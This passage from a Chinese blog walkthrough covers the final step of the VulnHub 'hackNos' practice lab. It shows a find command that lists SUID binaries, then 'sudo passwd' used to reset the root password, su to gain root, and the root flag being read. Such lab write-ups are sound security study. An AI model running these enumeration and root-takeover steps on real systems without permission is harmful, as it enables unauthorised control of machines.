<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>帅呆了，下面提权，找到第二个flag</p>
<p>运行下面命令寻找SUID提权可执行文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rohit@hacknos:~$ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/bin/su</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/fusermount</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/umount</span><br><span class="line">/usr/bin/traceroute6.iputils</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgidmap</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/newuidmap</span><br><span class="line">/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/snapd/snap-confine</span><br><span class="line">/usr/lib/policykit-1/polkit-agent-helper-1</span><br></pre></td></tr></table></figure>

<p>发现/usr/bin/passwd和/usr/bin/sudo都具有SUID权限，就可以使用sudo passwd修改root账户的密码，从而实现root用户登录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rohit@hacknos:~$ sudo passwd</span><br><span class="line">[sudo] password <span class="keyword">for</span> rohit: (输入rohit用户的密码)</span><br><span class="line">Enter new UNIX password: </span><br><span class="line">Retype new UNIX password: </span><br><span class="line">passwd: password updated successfully</span><br></pre></td></tr></table></figure>

<p>root登录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rohit@hacknos:~$ su</span><br><span class="line">Password: </span><br><span class="line">root@hacknos:/home/rohit<span class="comment">#cd /root</span></span><br><span class="line">root@hacknos:~<span class="comment"># ls</span></span><br><span class="line">root.txt</span><br><span class="line">root@hacknos:~<span class="comment"># cat root.txt </span></span><br><span class="line"> _______                         __              __  __     <span class="comment">#</span></span><br><span class="line">/       \                       /  |            /  |/  |    <span class="comment">#</span></span><br><span class="line">$$$$$$$  |  ______    ______   _$$ |_          _$$ |$$ |_   <span class="comment">#</span></span><br><span class="line">$$ |__$$ | /      \  /      \ / $$   |        / $$  $$   |  <span class="comment">#</span></span><br><span class="line">$$    $$&lt; /$$$$$$  |/$$$$$$  |$$$$$$/         $$$$$$$$$$/   <span class="comment">#</span></span><br><span class="line">$$$$$$$  |$$ |  $$ |$$ |  $$ |  $$ | __       / $$  $$   |  <span class="comment"># </span></span><br><span class="line">$$ |  $$ |$$ \__$$ |$$ \__$$ |  $$ |/  |      $$$$$$$$$$/   <span class="comment">#</span></span><br><span class="line">$$ |  $$ |$$    $$/ $$    $$/   $$  $$/         $$ |$$ |    <span class="comment">#</span></span><br><span class="line">$$/   $$/  $$$$$$/   $$$$$$/     $$$$/          $$/ $$/     <span class="comment">#</span></span><br><span class="line"><span class="comment">#############################################################                                                          </span></span><br><span class="line">                                                          </span><br><span class="line"><span class="comment">#############################################################                                                          </span></span><br><span class="line">MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b</span><br><span class="line"></span><br><span class="line">Blog : www.hackNos.com</span><br><span class="line"></span><br><span class="line">Author : Rahul Gehlaut</span><br><span class="line"></span><br><span class="line">linkedin : https://www.linkedin.com/<span class="keyword">in</span>/rahulgehlaut/</span><br><span class="line"><span class="comment">#############################################################</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub80.jpg"></p>
<p>至此第二个flag已经找到，挑战结束，帅掉渣。</p>
<p>各位大虾看了觉得不错的话。请捐助我一点，不要白嫖，thanks very much.</p>
<p>(本文全网首发，google都搜不到，发布日期：2019/12/20)</p>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
</search>
